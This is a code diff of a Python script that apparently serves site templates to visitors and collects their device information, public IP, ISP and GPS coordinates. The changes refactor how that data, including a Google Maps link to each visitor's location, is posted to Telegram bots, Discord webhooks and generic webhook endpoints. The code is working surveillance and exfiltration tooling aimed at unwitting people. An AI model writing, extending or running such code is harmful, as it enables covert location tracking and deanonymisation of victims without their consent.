@@ -14,8 +14,7 @@ import argparse
 import requests
 import traceback
 import shutil
-import re
-import time
+from time import sleep
 from os import path, kill, mkdir, getenv, environ, remove, devnull
 from json import loads, decoder
 from packaging import version
@@ -96,9 +95,7 @@ if print_v is True:
 
 import socket
 import importlib
-import urllib.parse
 from csv import writer
-from time import sleep
 import subprocess as subp
 from ipaddress import ip_address
 from signal import SIGTERM
@@ -107,6 +104,7 @@ from signal import SIGTERM
 with open(devnull, 'w') as nf:
 	sys.stderr = nf
 	import psutil
+sys.stderr = sys.__stderr__
 
 
 def banner():
@@ -135,35 +133,20 @@ def send_webhook(content, msg_type):
 			utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
 			return
 		if webhook.lower().startswith('https://discord.com/api/webhooks'):
-			from discord_webhook import sender
-			sender(webhook, msg_type, content)
+			from discord_webhook import discord_sender
+			discord_sender(webhook, msg_type, content)
 		else:
-			cpt = 3
-			for i in range(cpt):
-				rqst = None
-				try:
-					rqst = requests.post(webhook, json=content)
-				except Exception:
-					rqst = None
-				if rqst and rqst.ok:
-					return
-				time.sleep(i + 1)
-			utils.print(f'{R}[-] {C}Unable to reach the webhook endpoint, ensure it listens on a POST method and unauthenfied{W}')
+			requests.post(webhook, json=content)
 
 
-def send_telegram(content):
+def send_telegram(content, msg_type):
 	if telegram is not None:
 		tmpsplit = telegram.split(':')
 		if len(tmpsplit) < 3:
-			utils.print(f'{R}[-] {C}Provided Telegram bot information invalid : expected format is token:chatId (with colon){W}')
+			utils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')
 			return
-		content = re.sub('\33\[\d+m', ' ', content)
-		api_target_url = f'https://api.telegram.org/bot{tmpsplit[0]}:{tmpsplit[1]}/sendMessage?chat_id={tmpsplit[2]}&text={urllib.parse.quote_plus(content)}'
-		rqst = requests.get(api_target_url)
-		if rqst:
-			utils.print(f'{G}[+] {C}Successfully sent to Telegram bot {W}')
-		else:
-			utils.print(f'{R}[-] {C}Unable to send to Telegram bot {W}\n{rqst.status_code} => {rqst.text}')
+		from telegram_api import tgram_sender
+		tgram_sender(msg_type, content, tmpsplit)
 
 
 def template_select(site):
@@ -327,7 +310,7 @@ def data_parser():
 {G}[+] {C}Public IP  : {W}{var_ip}
 '''
 		utils.print(device_info)
-		send_telegram(device_info)
+		send_telegram(info_json, 'device_info')
 		send_webhook(info_json, 'device_info')
 
 		if ip_address(var_ip).is_private:
@@ -357,7 +340,7 @@ def data_parser():
 {G}[+] {C}ISP       : {W}{var_isp}
 '''
 				utils.print(ip_info)
-				send_telegram(ip_info)
+				send_telegram(data, 'ip_info')
 				send_webhook(data, 'ip_info')
 
 	with open(RESULT, 'r') as result_file:
@@ -387,19 +370,21 @@ def data_parser():
 {G}[+] {C}Speed     : {W}{var_spd}
 '''
 				utils.print(loc_info)
-				send_telegram(loc_info)
+				send_telegram(result_json, 'location')
 				send_webhook(result_json, 'location')
 				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+				gmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'}
 				utils.print(gmaps_url)
-				send_telegram(gmaps_url)
+				send_telegram(gmaps_json, 'url')
+				send_webhook(gmaps_json, 'url')
 
 				if kml_fname is not None:
 					kmlout(var_lat, var_lon)
 			else:
 				var_err = result_json['error']
-				errmsg = f'{R}[-] {C}{var_err}\n'
-				send_telegram(errmsg)
-				utils.print(errmsg)
+				utils.print(f'{R}[-] {C}{var_err}\n')
+				send_telegram(result_json, 'error')
+				send_webhook(result_json, 'error')
 
 	csvout(data_row)
 	clear()
